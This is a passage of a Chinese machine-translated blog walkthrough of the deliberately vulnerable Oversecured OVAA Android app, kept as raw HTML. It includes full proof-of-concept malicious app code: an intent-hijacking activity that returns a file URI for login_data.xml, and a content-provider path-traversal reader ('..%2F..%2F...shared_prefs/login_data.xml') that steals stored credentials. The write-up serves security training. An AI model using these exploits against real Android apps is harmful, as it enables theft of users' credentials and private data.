data-original-src="https://miro.medium.com/v2/resize:fit:1104/format:webp/1*R214SnwuQ_IDMDBSSOVFdw.png"/></div></figure><p id="8c5d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们成功地执行了<strong class="ka ir">意图注入</strong>，导致<strong class="ka ir">意图重定向</strong>到另一个<strong class="ka ir">受保护的活动。</strong></p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="c1a6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">但是我们不会停下来！还有更多的漏洞需要我们进一步寻找。一个<strong class="ka ir">隐含的意图</strong>有时可能被<strong class="ka ir">用来窃取一份机密数据作为文件</strong>。这也发生在过度安全的APK。</p><p id="5128" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们再来看看主活动课。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nr"><img src="../Images/63d76d65aa50193b80ed3c0def9eee06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cmDsZY8bc8ybAIPEyzvcBg.png"/></div></div></figure><p id="81a3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有一个<strong class="ka ir">隐式意图声明</strong>，它的目的是挑选/打开一个图像类型的文件，然后它等待一个设置为1001的结果代码，以便触发并对文件做一些事情，这可以在<strong class="ka ir"> onActivityResult() </strong>上看到。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/9ff7586d4470dc3a61e371a23040a80e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*I1Rfc7WtDw8TXV4rldjAuQ.png"/></div></div></figure><p id="6c3d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果我们看一下<strong class="ka ir"> FileUtils </strong>类，特别是关于<strong class="ka ir"> copyToCache </strong>方法，</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nt"><img src="../Images/324377242b3fad2f3d21ca8bcbe10400.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gz-VHNc3aabxLus8o0bpiw.png"/></div></div></figure><p id="24cc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它将打开一个位于<strong class="ka ir"> /storage/emulated/0 </strong>上的<strong class="ka ir">外部缓存目录</strong>(仅当您处于仿真环境中时)。如果是在真实环境中，我们可以参考这里的<a class="ae kw" href="https://www.programcreek.com/java-api-examples/?code=liaohuqiu%2Fcube-sdk%2Fcube-sdk-master%2Fcore%2Fsrc%2Fin%2Fsrain%2Fcube%2Fcache%2FDiskFileUtils.java" rel="noopener ugc nofollow" target="_blank"/>。文件名的输出将是以毫秒为单位的当前时间，它位于过安全APK的<strong class="ka ir">缓存目录</strong>中。</p><p id="2181" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了利用这个方法，我们将不得不<strong class="ka ir">伪造一个意图</strong>并将它们传递给<strong class="ka ir"> onActivityResult() </strong>并从<strong class="ka ir"> setResults() </strong>触发，以便它将我们的<strong class="ka ir">任意文件</strong>复制到<strong class="ka ir">外部缓存目录</strong>。虽然之前文件的类型被配置为图像类型，但是因为<strong class="ka ir"> android:priority = "999 "，</strong>的能力，它会覆盖它们，我们会在那里传递我们自己的意图。这是相当危险的，因为任何拥有<strong class="ka ir"> READ_EXTERNAL_STORAGE </strong>的<a class="ae kw" href="https://developer.android.com/guide/topics/manifest/uses-permission-element" rel="noopener ugc nofollow" target="_blank">权限</a>的应用程序也能够读取它。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nu"><img src="../Images/3f6a593880c029b0f2d2bc4e2738a5ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MpDJxD_OoGuAKrbvwolHhA.png"/></div></div></figure><p id="6d78" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们精心制作我们的恶意应用程序。</p><p id="02ab" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">应用程序的概念验证。</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="d0ed" class="nb nc iq mr b gy nd ne l nf ng">&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>&lt;manifest xmlns:android="<a class="ae kw" href="http://schemas.android.com/apk/res/android" rel="noopener ugc nofollow" target="_blank">http://schemas.android.com/apk/res/android</a>"<br/>    package="com.evil.evlfiletheftpartone"&gt;</span><span id="c8fd" class="nb nc iq mr b gy nh ne l nf ng">&lt;application<br/>        android:allowBackup="true"<br/>        android:icon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher</a>"<br/>        android:label="<a class="ae kw" href="http://twitter.com/string/app_name" rel="noopener ugc nofollow" target="_blank">@string/app_name</a>"<br/>        android:roundIcon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher_round" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher_round</a>"<br/>        android:supportsRtl="true"<br/>        android:theme="<a class="ae kw" href="http://twitter.com/style/Theme" rel="noopener ugc nofollow" target="_blank">@style/Theme</a>.Evlfiletheftpartone"&gt;<br/>        &lt;activity android:name=".thievesss" android:exported="true"&gt;<br/>            &lt;intent-filter android:priority="999"&gt;<br/>                &lt;action android:name="android.intent.action.PICK" /&gt;<br/>                &lt;category android:name="android.intent.category.DEFAULT" /&gt;<br/>                &lt;data android:mimeType="*/*" /&gt;<br/>                &lt;data android:mimeType="image/*" /&gt;<br/>            &lt;/intent-filter&gt;<br/>        &lt;/activity&gt;<br/>        &lt;activity android:name=".MainActivity" android:exported="true"&gt;<br/>            &lt;intent-filter&gt;<br/>                &lt;action android:name="android.intent.action.MAIN" /&gt;</span><span id="32de" class="nb nc iq mr b gy nh ne l nf ng">&lt;category android:name="android.intent.category.LAUNCHER" /&gt;<br/>            &lt;/intent-filter&gt;<br/>        &lt;/activity&gt;<br/>    &lt;/application&gt;</span><span id="8bbd" class="nb nc iq mr b gy nh ne l nf ng">&lt;/manifest&gt;</span></pre><p id="402d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">主活动类，</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="c111" class="nb nc iq mr b gy nd ne l nf ng">package com.evil.evlfiletheftpartone;</span><span id="7bfb" class="nb nc iq mr b gy nh ne l nf ng">import androidx.appcompat.app.AppCompatActivity;</span><span id="bbb4" class="nb nc iq mr b gy nh ne l nf ng">import android.content.Intent;<br/>import android.net.Uri;<br/>import android.os.Bundle;</span><span id="2cd5" class="nb nc iq mr b gy nh ne l nf ng">public class MainActivity extends AppCompatActivity {</span><span id="f5fe" class="nb nc iq mr b gy nh ne l nf ng"><a class="ae kw" href="http://twitter.com/Override" rel="noopener ugc nofollow" target="_blank">@Override</a><br/>    protected void onCreate(Bundle savedInstanceState) {<br/>        super.onCreate(savedInstanceState);<br/>        setContentView(R.layout.activity_main);<br/>        Intent cont = new Intent(getApplicationContext(),thievesss.class);<br/>        startActivity(cont);<br/>    }<br/>}</span></pre><p id="26b0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">偷窃课，</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="241e" class="nb nc iq mr b gy nd ne l nf ng">package com.evil.evlfiletheftpartone;</span><span id="c468" class="nb nc iq mr b gy nh ne l nf ng">import androidx.appcompat.app.AppCompatActivity;</span><span id="dfdc" class="nb nc iq mr b gy nh ne l nf ng">import android.content.Intent;<br/>import android.net.Uri;<br/>import android.os.Bundle;<br/>import android.os.StrictMode;</span><span id="8e81" class="nb nc iq mr b gy nh ne l nf ng">public class thievesss extends AppCompatActivity {</span><span id="8000" class="nb nc iq mr b gy nh ne l nf ng"><a class="ae kw" href="http://twitter.com/Override" rel="noopener ugc nofollow" target="_blank">@Override</a><br/>    protected void onCreate(Bundle savedInstanceState) {<br/>        super.onCreate(savedInstanceState);<br/>        setContentView(R.layout.activity_thievesss);<br/>        StrictMode.setVmPolicy(StrictMode.VmPolicy.LAX);<br/>        Intent stealing = new Intent();<br/>        stealing.setData(Uri.parse("file:///data/data/oversecured.ovaa/shared_prefs/login_data.xml"));<br/>        setResult(RESULT_OK,stealing);<br/>        finish();<br/>    }<br/>}</span></pre><p id="d0e2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">请注意，我们将传递解析应用程序的<strong class="ka ir">共享首选项</strong>中的login_data.xml的Uri数据，并使用<strong class="ka ir"> StrictMode.setVmPolicy </strong>来防止出现<a class="ae kw" href="https://stackoverflow.com/questions/38200282/android-os-fileuriexposedexception-file-storage-emulated-0-test-txt-exposed" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">文件方案异常</strong> </a>。</p><p id="4e4b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可能会运行两个应用程序，启动第一个应用程序的按钮，我们将不得不选择恶意应用程序。之后，我们可以再次签出<strong class="ka ir">外部缓存目录</strong>文件，我们将看到我们的XML登录数据。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nv"><img src="../Images/7e4e6cf50657864cd975381437a4f8e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k4r5Elclk89rr9OU8c00Ig.png"/></div></div></figure><p id="b597" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果声明了<strong class="ka ir"> startActivityForResult() </strong>并且使用的intent是<strong class="ka ir">非隐式</strong>，但是<strong class="ka ir">显式</strong>并且<strong class="ka ir"> setResults() </strong>已经在指定的活动上定义了怎么办？我们有可能创建一个恶意应用程序，其技术是<strong class="ka ir">意图拦截或重定向</strong>，这将重定向<strong class="ka ir"> </strong> <code class="fe mo mp mq mr b">extra</code>数据。这篇<a class="ae kw" href="https://payatu.com/blog/amit/Penetrate_the_protected_component_in_android_Part-2" rel="noopener ugc nofollow" target="_blank">文章</a>已经解释的这么好了！</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><p id="c723" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">接下来，我们将尝试检查应用程序中也存在的另一个组件，称为<a class="ae kw" href="https://www.tutorialspoint.com/android/android_content_providers.htm" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">内容提供者</strong> </a>。该组件允许一个应用程序与另一个应用程序共享数据，另一个应用程序甚至可以通过使用<strong class="ka ir"> ContentResolver </strong>类从另一个应用程序请求数据。</p><p id="d04e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在查询内容时，它还有一个通用语法，如下所示:</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="9f83" class="nb nc iq mr b gy nd ne l nf ng">&lt;prefix&gt;://&lt;authority-name&gt;/&lt;data_type&gt;/&lt;id&gt;</span></pre><p id="62a5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们再次回顾一下<strong class="ka ir"> Android Manifest </strong>文件，这一次，我们将寻找<strong class="ka ir"> provider </strong>标记。</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="7266" class="nb nc iq mr b gy nd ne l nf ng">&lt;<strong class="mr ir">provider</strong> android:name="oversecured.ovaa.providers.TheftOverwriteProvider" android:exported="true" android:authorities="oversecured.ovaa.theftoverwrite" /&gt;</span><span id="8412" class="nb nc iq mr b gy nh ne l nf ng">&lt;<strong class="mr ir">provider</strong> android:name="oversecured.ovaa.providers.CredentialsProvider" android:exported="false" android:authorities="oversecured.ovaa.creds_provider" android:grantUriPermissions="true" /&gt;</span><span id="ba49" class="nb nc iq mr b gy nh ne l nf ng">&lt;<strong class="mr ir">provider</strong> android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="oversecured.ovaa.fileprovider" android:grantUriPermissions="true"&gt;</span><span id="a510" class="nb nc iq mr b gy nh ne l nf ng">&lt;<strong class="mr ir">meta-data</strong> android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths" /&gt;</span><span id="6fc6" class="nb nc iq mr b gy nh ne l nf ng">&lt;/<strong class="mr ir">provider</strong>&gt;</span></pre><p id="1a67" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有三个内容提供者，其中一个可用于从任何应用程序调用，因为它是<strong class="ka ir">导出的</strong>，然而其中一个是<strong class="ka ir">未导出的</strong>，但它有一个<strong class="ka ir">授予权限</strong>。我们稍后将查看第二个，所以让我们检查第一个！</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nw"><img src="../Images/7b01b1bb0abca22587dd4942bd14acea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BO_0PHEfRlxNrojcRIsivQ.png"/></div></div></figure><p id="a172" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">内容提供商允许我们从<strong class="ka ir">外部存储目录</strong>中打开并读取某个文件，其模式值为<a class="ae kw" href="https://developer.android.com/reference/android/os/ParcelFileDescriptor#MODE_READ_WRITE" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir"> 805306368 </strong> </a>。这表示该文件可以读取或写入。但是因为文件在外部存储目录中，所以那里没有什么有趣的东西，不是吗？它<strong class="ka ir">可能</strong>不是，但更有趣的是，使用<strong class="ka ir"> getLastPathSegment() </strong>从<strong class="ka ir"> Uri </strong>最后一个路径段解析的文件名声明。</p><p id="49c3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如我们从本文档中所提到的，我们可以操纵读取应用程序内部的<strong class="ka ir">内部</strong>数据。例如，如果我想再次读取login_data.xml，我只需为一个<strong class="ka ir">路径遍历漏洞</strong>传递一个<strong class="ka ir">编码的斜杠</strong>。</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nx"><img src="../Images/6cdf9e921e1daad8c43fc0ebf2f697c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tybXJLnHEkJnwhcwuKDDeA.png"/></div></div></figure><p id="9b38" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们恶意应用程序的<strong class="ka ir"> PoC </strong>可能看起来像这些，</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="760d" class="nb nc iq mr b gy nd ne l nf ng">&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>&lt;manifest xmlns:android="<a class="ae kw" href="http://schemas.android.com/apk/res/android" rel="noopener ugc nofollow" target="_blank">http://schemas.android.com/apk/res/android</a>"<br/>    package="com.evil.eviltheftfileparttwo"&gt;</span><span id="d283" class="nb nc iq mr b gy nh ne l nf ng">&lt;application<br/>        android:allowBackup="true"<br/>        android:icon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher</a>"<br/>        android:label="<a class="ae kw" href="http://twitter.com/string/app_name" rel="noopener ugc nofollow" target="_blank">@string/app_name</a>"<br/>        android:roundIcon="<a class="ae kw" href="http://twitter.com/mipmap/ic_launcher_round" rel="noopener ugc nofollow" target="_blank">@mipmap/ic_launcher_round</a>"<br/>        android:supportsRtl="true"<br/>        android:theme="<a class="ae kw" href="http://twitter.com/style/Theme" rel="noopener ugc nofollow" target="_blank">@style/Theme</a>.Eviltheftfileparttwo"&gt;<br/>        &lt;activity android:name=".MainActivity" android:exported="true"&gt;<br/>            &lt;intent-filter&gt;<br/>                &lt;action android:name="android.intent.action.MAIN" /&gt;</span><span id="f313" class="nb nc iq mr b gy nh ne l nf ng">&lt;category android:name="android.intent.category.LAUNCHER" /&gt;<br/>            &lt;/intent-filter&gt;<br/>        &lt;/activity&gt;<br/>    &lt;/application&gt;</span><span id="812b" class="nb nc iq mr b gy nh ne l nf ng">&lt;/manifest&gt;</span></pre><p id="aa34" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">主活动类:</p><pre class="mi mj mk ml gt mx mr my mz aw na bi"><span id="dc8b" class="nb nc iq mr b gy nd ne l nf ng">package com.evil.eviltheftfileparttwo;</span><span id="233d" class="nb nc iq mr b gy nh ne l nf ng">import androidx.appcompat.app.AppCompatActivity;</span><span id="b2c9" class="nb nc iq mr b gy nh ne l nf ng">import android.content.ContentResolver;<br/>import android.net.Uri;<br/>import android.os.Bundle;<br/>import android.os.Environment;<br/>import android.util.Log;<br/>import android.widget.TextView;</span><span id="7ffa" class="nb nc iq mr b gy nh ne l nf ng">import java.io.BufferedReader;<br/>import java.io.File;<br/>import java.io.FileInputStream;<br/>import java.io.InputStreamReader;<br/>import java.util.ArrayList;</span><span id="fc98" class="nb nc iq mr b gy nh ne l nf ng">public class MainActivity extends AppCompatActivity {</span><span id="07ac" class="nb nc iq mr b gy nh ne l nf ng"><a class="ae kw" href="http://twitter.com/Override" rel="noopener ugc nofollow" target="_blank">@Override</a><br/>    protected void onCreate(Bundle savedInstanceState) {<br/>        super.onCreate(savedInstanceState);<br/>        setContentView(R.layout.activity_main);<br/>        TextView stealer = findViewById(R.id.stealedbuffer);<br/>        stealer.setText("");<br/>        try {<br/>            ArrayList&lt;String&gt; mylist = new ArrayList&lt;String&gt;();<br/>            File path = Environment.getExternalStorageDirectory();<br/>            Log.d("PATHssss",path.toString());<br/>            String pathtraversal = "..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Foversecured.ovaa%2Fshared_prefs%2Flogin_data.xml";<br/>            ContentResolver cr = this.getContentResolver();<br/>            FileInputStream fis = (FileInputStream)cr.openInputStream(Uri.parse("content://oversecured.ovaa.theftoverwrite/"+pathtraversal));<br/>            BufferedReader r = new BufferedReader(new InputStreamReader(fis));<br/>            String textss;<br/>            String mLine;<br/>            if ((mLine = r.readLine()) != null){<br/>                stealer.append("We finally got it!\n\n");<br/>            }<br/>            while ((mLine = r.readLine()) != null) {<br/>                stealer.append(mLine+"\n");<br/>            }</span><span id="4969" class="nb nc iq mr b gy nh ne l nf ng">} catch (Throwable th){<br/>            throw new RuntimeException(th);<br/>        }<br/>    }</span><span id="0679" class="nb nc iq mr b gy nh ne l nf ng">}</span></pre><p id="6596" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在此之后，我们只需生成恶意应用程序，就可以立即得到我们想要的东西。将显示登录数据！</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi ny"><img src="../Images/ae592c7b54a42ad4f5c5470c5776045a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1080/format:webp/1*A22Q-Ya0TijhrrrO8hLqQA.png"/></div></figure><p id="ec8f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">第二个内容提供商也存在另一个独特的漏洞。虽然提供者<strong class="ka ir">没有导出</strong>，但是我们可以从它的<strong class="ka ir"> grantUriPermission </strong>特别是与<strong class="ka ir">深层链接</strong>相关的<strong class="ka ir">中获得优势，以便<strong class="ka ir">再次窃取凭证</strong>。</strong></p><p id="b8d8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">已经有一篇关于这本书的精彩报道，你可以在这里看一下<a class="ae kw" href="https://payatu.com/blog/rahul.kumar/oversecured-ovaa-walkthrough-part1" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir"/></a>，作者是<strong class="ka ir">拉胡尔·库马尔</strong>，来自<a class="ae kw" href="https://payatu.com/" rel="noopener ugc nofollow" target="_blank">帕亚图</a>。</p><p id="9465" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我在这里写的并不多，我们仍然可以看到很多这里没有写的漏洞。我计划尽快更新它，并且我很乐意鼓励你作为读者朋友去尝试它，并且亲自测试它们！</p><blockquote class="le"><p id="40fb" class="lf lg iq bd lh li lj lk ll lm ln kv dk translated">我希望你学到了很多知识，知道通过另一个应用程序开发这样一个应用程序是多么有趣。如果有任何误导信息，请联系我！</p></blockquote><p id="7e27" class="pw-post-body-paragraph jy jz iq ka b kb nz kd ke kf oa kh ki kj ob kl km kn oc kp kq kr od kt ku kv ij bi translated">感谢我为完成这篇文章而引用的参考资料。</p><div class="of og gp gr oh oi"><a href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/intent-injection" rel="noopener  ugc nofollow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd ir gy z fp on fr fs oo fu fw ip bi translated">意向注入</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">在web security中打开重定向。因为类意图是可打包的，所以属于这个类的对象可以作为额外的…</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="or l"><div class="os l ot ou ov or ow jw oi"/></div></div></a></div><div class="of og gp gr oh oi"><a href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers" rel="noopener  ugc nofollow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd ir gy z fp on fr fs oo fu fw ip bi translated">利用内容提供商</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">清单-本地Windows权限提升</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="or l"><div class="ox l ot ou ov or ow jw oi"/></div></div></a></div><p id="5f9c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting" rel="noopener ugc nofollow" target="_blank">https://book . hack tricks . XYZ/mobile-pentesting/Android-app-pentesting</a></p><p id="ad21" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="https://developer.android.com/" rel="noopener ugc nofollow" target="_blank">https://developer.android.com</a></p><div class="of og gp gr oh oi"><a href="https://www.tutorialspoint.com/android/index.htm" rel="noopener  ugc nofollow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd ir gy z fp on fr fs oo fu fw ip bi translated">Android教程</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">Android是基于Linux的开源操作系统，适用于智能手机和平板电脑等移动设备…</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">www.tutorialspoint.com</p></div></div><div class="or l"><div class="oy l ot ou ov or ow jw oi"/></div></div></a></div><div class="of og gp gr oh oi"><a href="https://payatu.com/blog/amit/Penetrate_the_protected_component_in_android_Part-0" rel="noopener  ugc nofollow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd ir gy z fp on fr fs oo fu fw ip bi translated">穿透_受保护的_组件_in_android</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">大家好，在我们系列的上一篇博客中，我们讨论了Android应用程序的基本原理。这一系列的…</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">payatu.com</p></div></div><div class="or l"><div class="oz l ot ou ov or ow jw oi"/></div></div></a></div><div class="of og gp gr oh oi"><a href="https://payatu.com/blog/amit/Penetrate_the_protected_component_in_android_Part-2" rel="noopener  ugc nofollow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd ir gy z fp on fr fs oo fu fw ip bi translated">意图欺骗和意图拦截</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">大家好，欢迎回来！在这篇博客中，我们将尝试研究一些经常出现的基于意图的攻击手段…</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">payatu.com</p></div></div><div class="or l"><div class="pa l ot ou ov or ow jw oi"/></div></div></a></div><p id="9cbe" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">随时欢迎支持我！</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><a href="https://www.buymeacoffee.com/aseng"><div class="gh gi pb"><img src="../Images/f5fb7d7d10d5fbeecc8d2cf8f5c87523.png" data-original-src="https://miro.medium.com/v2/resize:fit:340/format:webp/0*e1SINbT3aOH24C_t.png"/></div></a></figure><p id="3728" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="https://trakteer.id/felix-alexander-swfnt/tip?open=true" rel="noopener ugc nofollow" target="_blank">https://trakteer.id/felix-alexander-swfnt/tip?open=true</a></p></div></div>    
</body>
</html>